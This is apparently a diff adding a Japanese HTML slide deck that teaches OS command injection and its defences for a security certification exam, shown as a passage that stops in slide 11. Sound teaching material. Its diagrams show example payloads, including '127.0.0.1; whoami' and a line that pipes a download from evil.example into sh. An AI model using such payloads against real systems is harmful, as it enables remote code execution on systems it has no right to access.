@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>OSコマンドインジェクション 解説スライド — s01-ep14</title>
+  <style>
+    :root {
+      --bg: #0f1419;
+      --panel: #1a2332;
+      --accent: #fb923c;
+      --accent2: #38bdf8;
+      --text: #e7edf4;
+      --muted: #8b9cb3;
+      --warn: #fbbf24;
+      --danger: #f87171;
+      --ok: #4ade80;
+      --font: "Segoe UI", "Hiragino Sans", "Hiragino Kaku Gothic ProN", Meiryo, sans-serif;
+      --mono: ui-monospace, "Cascadia Code", Consolas, monospace;
+    }
+    * { box-sizing: border-box; }
+    html {
+      font-size: clamp(17px, 0.55vw + 14px, 28px);
+    }
+    html, body {
+      margin: 0;
+      height: 100%;
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font);
+      overflow: hidden;
+    }
+    .deck { height: 100vh; display: flex; flex-direction: column; }
+    .slide {
+      flex: 1;
+      display: none;
+      padding: clamp(0.85rem, 2vh, 1.75rem) clamp(1rem, 4.5vw, 5rem) calc(5rem + env(safe-area-inset-bottom, 0px));
+      max-width: min(98vw, 1820px);
+      margin: 0 auto;
+      width: 100%;
+      min-height: calc(100vh - 5.25rem);
+      overflow-x: auto;
+      overflow-y: auto;
+      animation: in 0.35s ease;
+      font-size: 1.07rem;
+    }
+    .slide code {
+      font-family: var(--mono);
+      font-size: 0.94em;
+      padding: 0.08em 0.28em;
+      border-radius: 4px;
+      background: rgba(15, 23, 42, 0.65);
+    }
+    .slide.active { display: block; }
+    @keyframes in {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    h1 {
+      font-size: clamp(1.45rem, 2.4vw + 0.65rem, 2.35rem);
+      font-weight: 700;
+      margin: 0 0 0.45rem;
+      line-height: 1.28;
+      color: #fdba74;
+    }
+    h2 {
+      font-size: clamp(1.08rem, 1.15vw + 0.75rem, 1.55rem);
+      font-weight: 500;
+      color: var(--muted);
+      margin: 0 0 1rem;
+      line-height: 1.45;
+    }
+    .tag {
+      display: inline-block;
+      font-size: clamp(0.72rem, 0.6vw + 0.55rem, 0.95rem);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      color: var(--bg);
+      background: linear-gradient(90deg, #fb923c, #38bdf8);
+      padding: 0.28rem 0.65rem;
+      border-radius: 4px;
+      margin-bottom: 0.65rem;
+      font-weight: 700;
+    }
+    .diagram {
+      background: var(--panel);
+      border-radius: 14px;
+      padding: clamp(1rem, 2.2vw, 2rem);
+      margin: clamp(0.65rem, 1.5vh, 1.1rem) 0;
+      border: 1px solid rgba(251, 146, 60, 0.35);
+      zoom: 1.14;
+    }
+    @media (max-width: 900px) {
+      .diagram { zoom: 1.02; }
+    }
+    @media (min-width: 1600px) {
+      .diagram { zoom: 1.22; }
+    }
+    .diagram svg {
+      display: block;
+      width: 100%;
+      max-width: 100%;
+      height: auto;
+      overflow: visible;
+    }
+    .bullets { margin: 0.55rem 0 0; padding-left: 1.35rem; color: var(--muted); line-height: 1.72; font-size: 1.02em; }
+    .bullets li { margin: 0.42rem 0; }
+    .bullets strong { color: var(--text); }
+    .note { font-size: 0.95em; color: var(--muted); border-left: 4px solid var(--accent2); padding-left: 1.1rem; margin-top: 0.85rem; line-height: 1.55; }
+    .toolbar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0.85rem clamp(1rem, 3vw, 2.5rem);
+      background: rgba(15, 20, 25, 0.92);
+      border-top: 1px solid rgba(139, 156, 179, 0.2);
+      backdrop-filter: blur(8px);
+      z-index: 10;
+    }
+    .toolbar button {
+      background: var(--panel);
+      color: var(--text);
+      border: 1px solid rgba(251, 146, 60, 0.5);
+      padding: 0.55rem 1.25rem;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 1.05rem;
+      font-weight: 600;
+    }
+    .toolbar button:hover { background: #243044; }
+    .toolbar button:disabled { opacity: 0.4; cursor: not-allowed; }
+    .progress { font-size: 1.02rem; color: var(--muted); font-variant-numeric: tabular-nums; }
+    #scene-ref { font-family: var(--mono); font-weight: 500; color: #fdba74; font-size: 0.88em; max-width: 100%; }
+    .kbd { font-family: var(--mono); font-size: 0.85em; opacity: 0.88; }
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: clamp(0.85rem, 2vw, 1.4rem); }
+    @media (max-width: 900px) {
+      .grid-2 { grid-template-columns: 1fr; }
+      .slide { padding: 1.1rem clamp(0.85rem, 3vw, 1.5rem) 4.75rem; min-height: auto; }
+      html { font-size: clamp(16px, 2.5vw + 12px, 22px); }
+    }
+    .rich-box {
+      padding: clamp(1rem, 2vw, 1.45rem);
+      border-radius: 14px;
+      background: rgba(36, 48, 68, 0.4);
+      border: 1px solid rgba(139, 156, 179, 0.2);
+    }
+    .box-title { font-size: clamp(1rem, 0.8vw + 0.75rem, 1.2rem); font-weight: 700; margin-bottom: 0.5rem; color: var(--text); }
+    .box-desc { font-size: clamp(0.92rem, 0.5vw + 0.75rem, 1.05rem); color: var(--muted); line-height: 1.58; }
+    .theme-ok { border-color: rgba(74, 222, 128, 0.4); background: rgba(74, 222, 128, 0.05); }
+    .theme-ok .box-title { color: var(--ok); }
+    .theme-danger { border-color: rgba(248, 113, 113, 0.4); background: rgba(248, 113, 113, 0.05); }
+    .theme-danger .box-title { color: var(--danger); }
+    .theme-warn { border-color: rgba(251, 191, 36, 0.4); background: rgba(251, 191, 36, 0.05); }
+    .theme-warn .box-title { color: var(--warn); }
+    .theme-accent { border-color: rgba(251, 146, 60, 0.45); background: rgba(251, 146, 60, 0.06); }
+    .theme-accent .box-title { color: #fdba74; }
+    .slide-lead { font-size: clamp(1rem, 0.65vw + 0.8rem, 1.2rem); color: var(--muted); line-height: 1.65; margin: 0 0 0.9rem; }
+    .slide-lead strong { color: var(--text); }
+    .pill-row { display: flex; flex-wrap: wrap; gap: 0.4rem; margin: 0.5rem 0 0; }
+    .pill {
+      font-size: 0.7rem;
+      font-weight: 600;
+      padding: 0.22rem 0.5rem;
+      border-radius: 999px;
+      background: rgba(251, 146, 60, 0.12);
+      border: 1px solid rgba(251, 146, 60, 0.35);
+      color: #fed7aa;
+    }
+    .summary-hero {
+      font-size: clamp(0.95rem, 0.5vw + 0.8rem, 1.12rem); color: var(--muted); line-height: 1.65;
+      margin: 0 0 0.85rem; padding: clamp(0.85rem, 2vw, 1.15rem) clamp(1rem, 2.5vw, 1.35rem);
+      background: linear-gradient(180deg, rgba(26, 35, 50, 0.9), rgba(20, 28, 40, 0.75));
+      border-radius: 12px; border: 1px solid rgba(251, 146, 60, 0.25);
+    }
+    .summary-hero__label { margin: 0 0 0.5rem; font-size: clamp(0.88rem, 0.5vw + 0.65rem, 1rem); font-weight: 800; letter-spacing: 0.04em; color: #fdba74; }
+    .summary-hero__p { margin: 0 0 0.65rem; }
+    .summary-hero__p:last-child { margin-bottom: 0; }
+    .summary-hero strong { color: var(--text); }
+    .summary-pillars { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.5rem; margin: 0.3rem 0 0.75rem; }
+    @media (max-width: 700px) { .summary-pillars { grid-template-columns: 1fr; } }
+    .summary-pillar {
+      font-size: clamp(0.88rem, 0.45vw + 0.7rem, 1.02rem); font-weight: 600; line-height: 1.48; text-align: center; color: #a5b4c8;
+      padding: clamp(0.55rem, 1.2vw, 0.85rem); border-radius: 12px; background: rgba(15, 23, 42, 0.55);
+      border: 1px solid rgba(100, 116, 139, 0.35);
+    }
+    .summary-pillar b { display: block; font-size: clamp(0.78rem, 0.4vw + 0.62rem, 0.92rem); font-weight: 800; color: #fdba74; margin-bottom: 0.25rem; }
+    .summary-section-h { font-size: clamp(0.88rem, 0.5vw + 0.65rem, 1rem); font-weight: 700; color: #94a3b8; margin: 0.75rem 0 0.4rem; }
+    .summary-prev { border-left: 4px solid var(--accent2); padding: 0.7rem 0 0.7rem 1rem; margin-top: 0.8rem; background: rgba(30, 40, 55, 0.35); border-radius: 0 8px 8px 0; }
+    .summary-prev__tag { display: block; font-size: clamp(0.82rem, 0.45vw + 0.6rem, 0.95rem); font-weight: 800; color: #7dd3fc; margin-bottom: 0.35rem; }
+    .beginner-hint {
+      font-size: clamp(0.95rem, 0.5vw + 0.75rem, 1.1rem); color: #a5b4c8; line-height: 1.62; margin: 0.5rem 0 0;
+      padding: clamp(0.65rem, 1.5vw, 0.95rem) clamp(0.85rem, 2vw, 1.15rem); background: rgba(15, 23, 42, 0.55);
+      border-radius: 8px; border: 1px dashed rgba(251, 146, 60, 0.35);
+    }
+    .beginner-hint::before { content: "［図の読み方］ "; color: #fdba74; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <!--
+    第14回 OSコマンドインジェクション — 学習スライド（台本: s01-ep14-command-injection.yaml）
+    docs/series3/企画書.md: 全27回のうち第14回。リポジトリ内の第13回まで（Web/Season2）の続きとして配置。
+  -->
+  <div class="deck" id="deck">
+
+    <!-- 1 incident（台本は incident → opening。slideIndex 0,1 は YAML と一致） -->
+    <section class="slide active" data-i="1" data-yaml-scene="incident" title="導入">
+      <span class="tag">導入（incident）</span>
+      <h1>例：社内「接続診断」でホスト名を入力したら、想定外の処理まで動いた</h1>
+      <h2><code>ping</code> のあとに別コマンドを足す——シェルが1行全体を解釈する</h2>
+      <p class="beginner-hint">水色＝Webアプリ、オレンジ矢印＝シェルへ渡る文字列。赤い爆弾＝メタ文字で命令が分岐。</p>
+      <div class="diagram">
+        <svg viewBox="0 0 780 260" xmlns="http://www.w3.org/2000/svg" aria-label="導入シナリオ">
+          <defs>
+            <marker id="arrO14" markerWidth="9" markerHeight="9" refX="8" refY="3" orient="auto"><polygon points="0 0,9 3,0 6" fill="#fb923c"/></marker>
+          </defs>
+          <text x="390" y="18" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="sans-serif">① 入力にメタ文字を混ぜる → ② アプリが sh/cmd に渡す → ③ 複数コマンドが連鎖</text>
+          <rect x="40" y="40" width="200" height="100" rx="10" fill="#1e293b" stroke="#fb923c" stroke-width="2"/>
+          <text x="140" y="68" text-anchor="middle" fill="#fdba74" font-size="11" font-weight="700" font-family="sans-serif">管理画面</text>
+          <text x="140" y="92" text-anchor="middle" fill="#e7edf4" font-size="9" font-family="sans-serif">host=</text>
+          <text x="140" y="112" text-anchor="middle" fill="#fecaca" font-size="8" font-family="monospace">127.0.0.1; whoami</text>
+          <path d="M 245 90 L 290 90" stroke="#fb923c" stroke-width="3" marker-end="url(#arrO14)"/>
+          <text x="265" y="82" text-anchor="middle" fill="#fdba74" font-size="8">HTTP</text>
+          <rect x="300" y="40" width="200" height="100" rx="10" fill="#1e293b" stroke="#38bdf8" stroke-width="2"/>
+          <text x="400" y="68" text-anchor="middle" fill="#7dd3fc" font-size="11" font-weight="700" font-family="sans-serif">Webアプリ</text>
+          <text x="400" y="92" text-anchor="middle" fill="#cbd5e1" font-size="8.5" font-family="sans-serif">文字列連結で ping コマンド生成</text>
+          <text x="400" y="112" text-anchor="middle" fill="#f87171" font-size="8" font-family="sans-serif">検証なし ☓</text>
+          <path d="M 505 90 L 550 90" stroke="#38bdf8" stroke-width="2" marker-end="url(#arrO14)"/>
+          <text x="525" y="82" text-anchor="middle" fill="#7dd3fc" font-size="8">1行を渡す</text>
+          <rect x="560" y="35" width="190" height="210" rx="10" fill="#0f172a" stroke="#64748b" stroke-width="2"/>
+          <text x="655" y="58" text-anchor="middle" fill="#94a3b8" font-size="10" font-weight="700" font-family="sans-serif">OS / シェル</text>
+          <rect x="575" y="75" width="160" height="45" rx="4" fill="rgba(56,189,248,0.12)" stroke="#38bdf8"/>
+          <text x="655" y="100" text-anchor="middle" fill="#bae6fd" font-size="8" font-family="sans-serif">ping 127.0.0.1</text>
+          <text x="655" y="118" text-anchor="middle" fill="#8b9cb3" font-size="7.5" font-family="sans-serif">（意図）</text>
+          <rect x="575" y="135" width="160" height="45" rx="4" fill="rgba(248,113,113,0.15)" stroke="#f87171"/>
+          <text x="655" y="160" text-anchor="middle" fill="#fecaca" font-size="8" font-family="sans-serif">; whoami …</text>
+          <text x="655" y="178" text-anchor="middle" fill="#8b9cb3" font-size="7.5" font-family="sans-serif">（追加入力が実行）</text>
+          <rect x="40" y="165" width="500" height="80" rx="8" fill="rgba(127,29,29,0.15)" stroke="#f87171"/>
+          <text x="290" y="195" text-anchor="middle" fill="#fca5a5" font-size="10" font-weight="700" font-family="sans-serif">学習ポイント: 「引数」ではなく「シェル行」として解釈されると広がる</text>
+          <text x="290" y="220" text-anchor="middle" fill="#cbd5e1" font-size="8.5" font-family="sans-serif">試験では「入力検証だけ」「エスケープだけ」に頼る案が誤答になりやすい</text>
+        </svg>
+      </div>
+    </section>
+
+    <!-- 2 opening -->
+    <section class="slide" data-i="2" data-yaml-scene="opening" title="冒頭">
+      <span class="tag">第14回 · 図解多め</span>
+      <h1>【登録セキスペ 第14回｜Season2】OSコマンドインジェクションを攻略</h1>
+      <h2>ユーザー入力が <strong>シェル</strong> に渡り、想定外のOSコマンドまで実行される欠陥</h2>
+      <p class="slide-lead">第13回は <strong>ファイルを開くパス</strong> の話。第14回は <strong>シェルが1行を解釈してプロセスを起こす</strong> 話。<code style="color:#fdba74;font-family:var(--mono)">|</code> や <code style="color:#fdba74;font-family:var(--mono)">;</code> で「つながって」別命令が走るイメージを押さえる。</p>
+      <div class="grid-2" style="margin:0.5rem 0 0.75rem;">
+        <div class="rich-box theme-accent">
+          <div class="box-title">この回の立ち位置</div>
+          <div class="box-desc">Webの弱点 · Season2 第14回（全27回企画の第14回）。台本: <code style="font-family:var(--mono);font-size:0.78rem;color:#fdba74">s01-ep14-command-injection.yaml</code></div>
+        </div>
+        <div class="rich-box theme-warn">
+          <div class="box-title">第13回（パストラバーサル）との違い</div>
+          <div class="box-desc">パストラバーサル ＝ 主に <strong>読み取り</strong>（任意ファイル読取）。OSコマンド注入 ＝ <strong>実行</strong>（シェル／OS API 経由でプロセス起動）。目的と経路が違う。</div>
+        </div>
+      </div>
+      <ul class="bullets">
+        <li>学習目標①：なぜ「文字列をコマンドラインに連結する」のが危険か、メタ文字で説明できる。</li>
+        <li>学習目標②：診断機能・バッチ呼び出し・画像変換など、典型的な発生箇所を挙げられる。</li>
+        <li>学習目標③：<strong>シェルを通さない</strong>・<strong>引数配列で渡す</strong>・<strong>ホワイトリスト</strong> など対策の型を言える。</li>
+        <li>学習目標④：SQLi・SSRF・第13回と「入力が効くレイヤ」を混同しない。</li>
+      </ul>
+      <div class="diagram" style="padding:0.85rem 1rem;">
+        <svg viewBox="0 0 860 108" xmlns="http://www.w3.org/2000/svg" aria-label="本編の流れ">
+          <defs>
+            <linearGradient id="go14" x1="0%" y1="0%" x2="100%" y2="0%">
+              <stop offset="0%" style="stop-color:#fb923c"/><stop offset="100%" style="stop-color:#38bdf8"/>
+            </linearGradient>
+            <marker id="m14" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+              <polygon points="0 0,8 3,0 6" fill="#fb923c"/>
+            </marker>
+          </defs>
+          <text x="430" y="14" text-anchor="middle" fill="#8b9cb3" font-size="10" font-family="sans-serif">スライドの流れ: 導入 → シェル3段 → 連結の穴 → メタ文字 → ブラインド → 発生箇所 → 対策①②③ → 混同ゼロ → 試験 → まとめ</text>
+          <g transform="translate(6,32)" font-family="sans-serif">
+            <rect x="0" y="0" width="48" height="46" rx="6" fill="#243044" stroke="#fb923c"/>
+            <text x="24" y="28" text-anchor="middle" fill="#e7edf4" font-size="8">導入</text>
+            <path d="M52 23h8" stroke="url(#go14)" stroke-width="2" marker-end="url(#m14)"/>
+            <rect x="66" y="0" width="52" height="46" rx="6" fill="#243044" stroke="#38bdf8"/>
+            <text x="92" y="28" text-anchor="middle" fill="#e7edf4" font-size="7.5">3段階</text>
+            <path d="M124 23h8" stroke="url(#go14)" stroke-width="2"/>
+            <rect x="138" y="0" width="52" height="46" rx="6" fill="#243044" stroke="#f87171"/>
+            <text x="164" y="28" text-anchor="middle" fill="#e7edf4" font-size="7.5">連結</text>
+            <path d="M194 23h8" stroke="url(#go14)" stroke-width="2"/>
+            <rect x="208" y="0" width="52" height="46" rx="6" fill="#243044" stroke="#fbbf24"/>
+            <text x="234" y="28" text-anchor="middle" fill="#e7edf4" font-size="7.5">メタ文字</text>
+            <path d="M264 23h8" stroke="url(#go14)" stroke-width="2"/>
+            <rect x="278" y="0" width="52" height="46" rx="6" fill="#243044" stroke="#a78bfa"/>
+            <text x="304" y="28" text-anchor="middle" fill="#e7edf4" font-size="7.5">ブラインド</text>
+            <path d="M334 23h8" stroke="url(#go14)" stroke-width="2"/>
+            <rect x="348" y="0" width="52" height="46" rx="6" fill="#243044" stroke="#4ade80"/>
+            <text x="374" y="28" text-anchor="middle" fill="#e7edf4" font-size="7.5">どこで</text>
+            <path d="M404 23h8" stroke="url(#go14)" stroke-width="2"/>
+            <rect x="418" y="0" width="48" height="46" rx="6" fill="#243044" stroke="#22d3ee"/>
+            <text x="442" y="28" text-anchor="middle" fill="#e7edf4" font-size="7.5">対策①</text>
+            <path d="M470 23h8" stroke="url(#go14)" stroke-width="2"/>
+            <rect x="484" y="0" width="48" height="46" rx="6" fill="#243044" stroke="#2dd4bf"/>
+            <text x="508" y="28" text-anchor="middle" fill="#e7edf4" font-size="7.5">対策②</text>
+            <path d="M536 23h8" stroke="url(#go14)" stroke-width="2"/>
+            <rect x="550" y="0" width="48" height="46" rx="6" fill="#243044" stroke="#c084fc"/>
+            <text x="574" y="28" text-anchor="middle" fill="#e7edf4" font-size="7.5">対策③</text>
+            <path d="M602 23h8" stroke="url(#go14)" stroke-width="2"/>
+            <rect x="616" y="0" width="52" height="46" rx="6" fill="#243044" stroke="#94a3b8"/>
+            <text x="642" y="28" text-anchor="middle" fill="#e7edf4" font-size="7.5">混同ゼロ</text>
+            <path d="M672 23h8" stroke="url(#go14)" stroke-width="2"/>
+            <rect x="686" y="0" width="44" height="46" rx="6" fill="#243044" stroke="#f87171"/>
+            <text x="708" y="28" text-anchor="middle" fill="#e7edf4" font-size="8">試験</text>
+            <path d="M734 23h8" stroke="url(#go14)" stroke-width="2"/>
+            <rect x="748" y="0" width="52" height="46" rx="6" fill="#243044" stroke="#38bdf8"/>
+            <text x="774" y="28" text-anchor="middle" fill="#e7edf4" font-size="7.5">まとめ</text>
+          </g>
+        </svg>
+      </div>
+      <p class="note">操作: <span class="kbd">→</span> <span class="kbd">←</span> <span class="kbd">Space</span>。下段は <code style="font-family:var(--mono);font-size:0.8rem">s01-ep14-command-injection.yaml</code> の <code style="font-family:var(--mono);font-size:0.8rem">scenes / id</code>。</p>
+    </section>
+
+    <!-- 3 shell stack -->
+    <section class="slide" data-i="3" data-yaml-scene="concept_shell" title="概念">
+      <span class="tag">仕組み①</span>
+      <h1>アプリ → シェル（sh / cmd / PowerShell）→ OS — の3段階</h1>
+      <h2>脆弱性は「OS」より前に、<strong>シェルの解釈</strong> に現れることが多い</h2>
+      <div class="diagram">
+        <svg viewBox="0 0 760 200" xmlns="http://www.w3.org/2000/svg">
+          <rect x="40" y="50" width="160" height="90" rx="10" fill="#1e293b" stroke="#fb923c" stroke-width="2"/>
+          <text x="120" y="82" text-anchor="middle" fill="#fdba74" font-size="11" font-weight="700" font-family="sans-serif">① Webアプリ</text>
+          <text x="120" y="108" text-anchor="middle" fill="#e7edf4" font-size="9" font-family="sans-serif">ユーザー入力を文字列結合</text>
+          <path d="M 205 95 L 255 95" stroke="#94a3b8" stroke-width="3"/>
+          <polygon points="255,95 245,90 245,100" fill="#94a3b8"/>
+          <rect x="260" y="50" width="200" height="90" rx="10" fill="#1e293b" stroke="#fbbf24" stroke-width="2"/>
+          <text x="360" y="82" text-anchor="middle" fill="#fde68a" font-size="11" font-weight="700" font-family="sans-serif">② シェル</text>
+          <text x="360" y="108" text-anchor="middle" fill="#e7edf4" font-size="9" font-family="sans-serif">パイプ・リダイレクト・区切りを解釈</text>
+          <path d="M 465 95 L 515 95" stroke="#94a3b8" stroke-width="3"/>
+          <polygon points="515,95 505,90 505,100" fill="#94a3b8"/>
+          <rect x="520" y="50" width="200" height="90" rx="10" fill="#1e293b" stroke="#4ade80" stroke-width="2"/>
+          <text x="620" y="82" text-anchor="middle" fill="#86efac" font-size="11" font-weight="700" font-family="sans-serif">③ OS カーネル</text>
+          <text x="620" y="108" text-anchor="middle" fill="#e7edf4" font-size="9" font-family="sans-serif">プロセス起動・ファイル操作</text>
+          <text x="380" y="175" text-anchor="middle" fill="#8b9cb3" font-size="9.5" font-family="sans-serif">対策の本命は ② を経由しない（後述）か、② に渡す前に設計を変えること</text>
+        </svg>
+      </div>
+      <ul class="bullets">
+        <li><strong>APIの選び方</strong>：<code>system("ping "+input)</code> 型はシェル呼び出しになりやすい。言語・関数ごとに挙動を確認。</li>
+        <li>試験では「入力をサニタイズしたから安全」より「<strong>シェルを使わない</strong>」が正解側になりやすい。</li>
+      </ul>
+    </section>
+
+    <!-- 4 concatenation -->
+    <section class="slide" data-i="4" data-yaml-scene="concat_problem" title="連結">
+      <span class="tag">欠陥の核</span>
+      <h1>固定文字列 + ユーザー入力 を1本の「シェル行」にする — が危険の典型</h1>
+      <h2>アプリ作者は「ping の引数だけ増える」と思うが、実際は <strong>行全体の文法</strong> に載る</h2>
+      <div class="grid-2">
+        <div class="rich-box theme-danger">
+          <div class="box-title">危険パターン（概念図）</div>
+          <div class="box-desc"><code>sh -c "ping -c 1 " + userInput</code><br>閉じクォートの位置次第で、入力がクォート外に「はみ出す」型も頻出。</div>
+        </div>
+        <div class="rich-box theme-ok">
+          <div class="box-title">望ましい方向性</div>
+          <div class="box-desc">プロセス起動APIで <strong>argv[0]=ping, argv[1]=…</strong> のように配列渡し。シェルが介在しない。</div>
+        </div>
+      </div>
+      <p class="note">試験の記述問題では「エスケープ処理を追加」より「<strong>起動方法の変更</strong>」が高得点ラインになりやすい。</p>
+    </section>
+
+    <!-- 5 metacharacters -->
+    <section class="slide" data-i="5" data-yaml-scene="metacharacters" title="メタ文字">
+      <span class="tag">仕組み②</span>
+      <h1>メタ文字（区切り・置換・パイプ）が「第二・第三のコマンド」を生む</h1>
+      <h2>例: <code>;</code> <code>|</code> <code>&amp;&amp;</code> <code>||</code> <code>`</code> <code>$()</code> 改行 <code>&gt;</code> など（環境依存あり）</h2>
+      <div class="diagram">
+        <svg viewBox="0 0 800 150" xmlns="http://www.w3.org/2000/svg">
+          <text x="400" y="22" text-anchor="middle" fill="#94a3b8" font-size="11" font-family="sans-serif">1行の中に「複数の文」が入ると、シェルは順に処理する</text>
+          <rect x="60" y="45" width="680" height="90" rx="10" fill="#0f172a" stroke="#f87171" stroke-width="1.5"/>
+          <text x="400" y="78" text-anchor="middle" fill="#fecaca" font-size="10" font-family="monospace">ping 127.0.0.1 ; curl http://evil.example/x | sh</text>
+          <text x="400" y="108" text-anchor="middle" fill="#8b9cb3" font-size="9" font-family="sans-serif">左から順に / パイプで次プロセスへ — 試験では「どの文字が区切りか」より「シェルに1行渡すな」が本質</text>
+        </svg>
+      </div>
+      <ul class="bullets">
+        <li><strong>フィルタの罠</strong>：特定記号だけ禁止しても、別のメタ表現・エンコーディングで迂回する話が出題されうる。</li>
+      </ul>
+    </section>
+
+    <!-- 6 blind -->
+    <section class="slide" data-i="6" data-yaml-scene="blind_output" title="ブラインド">
+      <span class="tag">応用</span>
+      <h1>出力が画面に返らない「ブラインド」でも成立する</h1>
+      <h2>DNS・HTTP外向き・タイム遅延などで「実行されたか」を推測する（試験は概念レベル）</h2>
+      <div class="diagram">
+        <svg viewBox="0 0 720 130" xmlns="http://www.w3.org/2000/svg">
+          <rect x="40" y="35" width="200" height="70" rx="8" fill="rgba(56,189,248,0.1)" stroke="#38bdf8"/>
+          <text x="140" y="62" text-anchor="middle" fill="#7dd3fc" font-size="10" font-weight="700" font-family="sans-serif">攻撃者</text>
+          <text x="140" y="88" text-anchor="middle" fill="#e7edf4" font-size="8.5" font-family="sans-serif">出力なし</text>
+          <path d="M 245 70 L 300 70" stroke="#94a3b8" stroke-width="2"/>
+          <rect x="310" y="35" width="200" height="70" rx="8" fill="rgba(251,146,60,0.1)" stroke="#fb923c"/>
+          <text x="410" y="62" text-anchor="middle" fill="#fdba74" font-size="10" font-weight="700" font-family="sans-serif">副作用で観測</text>
+          <text x="410" y="88" text-anchor="middle" fill="#e7edf4" font-size="8" font-family="sans-serif">外向き通信 / 遅延</text>
+          <path d="M 515 70 L 570 70" stroke="#94a3b8" stroke-width="2"/>
+          <rect x="580" y="35" width="120" height="70" rx="8" fill="rgba(74,222,128,0.08)" stroke="#4ade80"/>
+          <text x="640" y="75" text-anchor="middle" fill="#86efac" font-size="9" font-weight="700" font-family="sans-serif">推測成功</text>
+        </svg>
+      </div>
+      <p class="note">対策の本質は変わらない。<strong>シェル経由の任意実行を許さない</strong>こと。</p>
+    </section>
+
+    <!-- 7 surfaces -->
+    <section class="slide" data-i="7" data-yaml-scene="surfaces" title="発生箇所">
+      <span class="tag">どこで起きる？</span>
+      <h1>「外部コマンドを便利に呼びたい」機能ほど事故りやすい</h1>
+      <h2>診断・レポート生成・画像/動画変換・PDF・ウイルススキャン連携 など</h2>
+      <div class="diagram">
+        <svg viewBox="0 0 820 160" xmlns="http://www.w3.org/2000/svg">
+          <rect x="20" y="35" width="250" height="100" rx="10" fill="rgba(56,189,248,0.08)" stroke="#38bdf8"/>
+          <text x="145" y="62" text-anchor="middle" fill="#7dd3fc" font-size="11" font-weight="700" font-family="sans-serif">① ネットワーク診断</text>
+          <text x="145" y="88" text-anchor="middle" fill="#e7edf4" font-size="9" font-family="sans-serif">ping / traceroute / nslookup</text>
+          <text x="145" y="112" text-anchor="middle" fill="#8b9cb3" font-size="8" font-family="sans-serif">管理画面に露出しがち</text>
+          <rect x="285" y="35" width="250" height="100" rx="10" fill="rgba(251,146,60,0.08)" stroke="#fb923c"/>
+          <text x="410" y="62" text-anchor="middle" fill="#fdba74" font-size="11" font-weight="700" font-family="sans-serif">② メディア処理</text>
+          <text x="410" y="88" text-anchor="middle" fill="#e7edf4" font-size="9" font-family="sans-serif">ImageMagick / ffmpeg 等CLI</text>
+          <text x="410" y="112" text-anchor="middle" fill="#8b9cb3" font-size="8" font-family="sans-serif">ファイル名に入力が混ざる</text>
+          <rect x="550" y="35" width="250" height="100" rx="10" fill="rgba(167,139,250,0.1)" stroke="#a78bfa"/>
+          <text x="675" y="62" text-anchor="middle" fill="#c4b5fd" font-size="11" font-weight="700" font-family="sans-serif">③ メンテ用スクリプト</text>
+          <text x="675" y="88" text-anchor="middle" fill="#e7edf4" font-size="9" font-family="sans-serif">バッチ・cron 呼び出し</text>
+          <text x="675" y="112" text-anchor="middle" fill="#8b9cb3" font-size="8" font-family="sans-serif">引数にHTTPパラメータ直結</text>
+        </svg>
+      </div>
+    </section>
+
+    <!-- 8 defense no shell -->
+    <section class="slide" data-i="8" data-yaml-scene="defense_no_shell" title="対策①">
+      <span class="tag">対策①</span>
+      <h1>シェルを経由しないプロセス起動（execve 系・引数配列）</h1>
+      <h2>「同じ ping でも、呼び方で安全性が変わる」が試験の定番</h2>
+      <div class="grid-2">
+        <div class="rich-box theme-ok">
+          <div class="box-title">推奨イメージ</div>
+          <div class="box-desc">・バイナリパスは固定<br>・ホスト名は argv[1] として渡す<br>・シェルは起動しない</div>
+        </div>
+        <div class="rich-box theme-danger">
+          <div class="box-title">避ける</div>
+          <div class="box-desc"><code>Runtime.exec(string一行)</code> や <code>os.system</code> など「文字列1本」APIの安易な利用（言語により名称不同）。</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 9 defense design -->
+    <section class="slide" data-i="9" data-yaml-scene="defense_design" title="対策②">
+      <span class="tag">対策②</span>
+      <h1>そもそも「任意ホストへ ping」機能を公開しない／権限を絞る</h1>
+      <h2>技術対策と運用設計の両方が問われる</h2>
+      <ul class="bullets">
+        <li><strong>ネットワーク分離</strong>：診断機能を社内限定・VPN 内・管理者ロールのみに限定。</li>
+        <li><strong>サンドボックス</strong>：コンテナや低権限ユーザーで外部コマンドを実行（踏み台被害の軽減）。</li>
+        <li>試験では「WAFだけ」「入力禁止文字だけ」より、<strong>機能削減・権限最小化</strong>が並ぶ。</li>
+      </ul>
+    </section>
+
+    <!-- 10 defense whitelist -->
+    <section class="slide" data-i="10" data-yaml-scene="defense_whitelist" title="対策③">
+      <span class="tag">対策③</span>
+      <h1>どうしても入力を受けるならホワイトリスト＋形式検証</h1>
+      <h2>「危険文字を全部列挙」より「許可する形だけ通す」</h2>
+      <div class="rich-box theme-warn">
+        <div class="box-title">例（考え方）</div>
+        <div class="box-desc">ホスト名なら <strong>FQDN の文法に合致</strong> かつ <strong>解決先が許可リスト</strong>、など。<br>ただし最終防衛線は依然として「シェルを挟まない起動」。</div>
+      </div>
+    </section>
+
+    <!-- 11 compare -->
+    <section class="slide" data-i="11" data-yaml-scene="compare_axes" title="混同ゼロ">
+      <span class="tag">用語の整理</span>
+      <h1>入力が「どのエンジン」に効くかで分類する</h1>
+      <h2>一枚の表（試験の整理用）</h2>
+      <div class="diagram" style="padding:0.75rem;">
+        <svg viewBox="0 0 880 210" xmlns="http://www.w3.org/2000/svg">
+          <text x="440" y="22" text-anchor="middle" fill="#94a3b8" font-size="11" font-weight="700" font-family="sans-serif">横：効く先　／　縦：代表的な欠陥名</text>
+          <rect x="25" y="42" width="250" height="150" rx="10" fill="rgba(248,113,113,0.08)" stroke="#f87171"/>
+          <text x="150" y="72" text-anchor="middle" fill="#fca5a5" font-size="11" font-weight="800" font-family="sans-serif">OSコマンド注入</text>
